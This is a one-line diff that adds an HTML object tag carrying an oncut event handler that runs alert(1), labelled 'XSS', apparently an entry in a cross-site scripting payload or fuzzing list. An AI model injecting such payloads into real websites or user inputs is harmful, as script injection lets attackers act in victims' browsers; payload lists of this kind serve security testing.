@@ -1,0 +1,1 @@
+<object oncut=alert(1) value="XSS" autofocus tabindex=1>test
